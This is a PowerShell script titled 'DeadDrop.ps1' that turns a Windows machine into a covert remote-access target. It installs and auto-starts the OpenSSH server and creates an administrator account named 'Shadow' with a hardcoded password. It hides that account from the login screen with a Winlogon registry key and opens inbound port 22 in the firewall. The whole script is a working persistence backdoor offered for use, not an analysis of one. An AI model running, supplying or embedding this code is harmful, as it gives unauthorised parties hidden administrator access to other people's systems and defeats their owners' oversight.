# DeadDrop.ps1
# PowerShell script for deploying SSH and hidden admin user on Windows
# Author: YourNameHere

# Function to print red ASCII banner
function Print-Banner {
    $ascii = @"
 ____              _           
|  _ \  ___   ___ | | _____ _ __ 
| | | |/ _ \ / _ \| |/ / _ \ '__|
| |_| | (_) | (_) |   <  __/ |   
|____/ \___/ \___/|_|\_\___|_|   
                                 
"@
    Write-Host $ascii -ForegroundColor Red
}

function Check-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
        Write-Error "Script must be run as Administrator."
        exit 1
    }
}

function Install-OpenSSH {
    Write-Host "[*] Checking OpenSSH installation..." -ForegroundColor Cyan

    $sshClient = Get-WindowsCapability -Online | Where-Object Name -like "OpenSSH.Client*"
    $sshServer = Get-WindowsCapability -Online | Where-Object Name -like "OpenSSH.Server*"

    try {
        if ($sshClient.State -ne "Installed") {
            Write-Host "[*] Installing OpenSSH Client..."
            Add-WindowsCapability -Online -Name $sshClient.Name -ErrorAction Stop
            Write-Host "[+] OpenSSH Client installed."
        } else {
            Write-Host "[*] OpenSSH Client already installed."
        }

        if ($sshServer.State -ne "Installed") {
            Write-Host "[*] Installing OpenSSH Server..."
            Add-WindowsCapability -Online -Name $sshServer.Name -ErrorAction Stop
            Write-Host "[+] OpenSSH Server installed."
        } else {
            Write-Host "[*] OpenSSH Server already installed."
        }
    } catch {
        Write-Error "[!] Failed to install OpenSSH: $_"
        exit 1
    }

    try {
        # Set SSH Server service to automatic and start it
        Write-Host "[*] Configuring SSH Server service..."
        Set-Service -Name sshd -StartupType Automatic
        Start-Service sshd
        Write-Host "[+] SSH Server service started and set to automatic."

        # Enable ssh-agent service for key management
        Write-Host "[*] Enabling ssh-agent service..."
        Set-Service -Name ssh-agent -StartupType Automatic
        Start-Service ssh-agent
        Write-Host "[+] ssh-agent service started and set to automatic."
    } catch {
        Write-Error "[!] Failed to configure SSH services: $_"
        exit 1
    }
}

function Create-ShadowUser {
    $username = "Shadow"
    $password = "Shadow123!"

    # Check if user exists
    $userExists = Get-LocalUser -Name $username -ErrorAction SilentlyContinue
    if ($userExists) {
        Write-Host "[*] User '$username' already exists."
    } else {
        try {
            Write-Host "[*] Creating user '$username'..."
            $securePass = ConvertTo-SecureString $password -AsPlainText -Force
            New-LocalUser -Name $username -Password $securePass -FullName "Shadow User" -Description "Hidden admin user" -PasswordNeverExpires -AccountNeverExpires
            Write-Host "[+] User '$username' created."

            # Add user to Administrators group
            Write-Host "[*] Adding '$username' to Administrators group..."
            Add-LocalGroupMember -Group "Administrators" -Member $username
            Write-Host "[+] User '$username' added to Administrators group."

            # Hide user from login screen by setting registry key
            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
            New-ItemProperty -Path $regPath -Name $username -PropertyType DWord -Value 0 -Force | Out-Null
            Write-Host "[+] User '$username' hidden from login screen."
        } catch {
            Write-Error "[!] Failed to create or hide user '$username': $_"
            exit 1
        }
    }
}

function Add-FirewallRule {
    $ruleName = "Allow SSH Port 22"

    # Check if firewall rule exists
    $existingRule = Get-NetFirewallRule -DisplayName $ruleName -ErrorAction SilentlyContinue
    if ($existingRule) {
        Write-Host "[*] Firewall rule '$ruleName' already exists."
    } else {
        try {
            Write-Host "[*] Adding firewall rule to allow port 22..."
            New-NetFirewallRule -DisplayName $ruleName -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow
            Write-Host "[+] Firewall rule added."
        } catch {
            Write-Error "[!] Failed to add firewall rule: $_"
            exit 1
        }
    }
}

# Main Execution

Print-Banner

Check-Admin

Install-OpenSSH

Create-ShadowUser

Add-FirewallRule

Write-Host "`n[+] Setup complete." -ForegroundColor Green
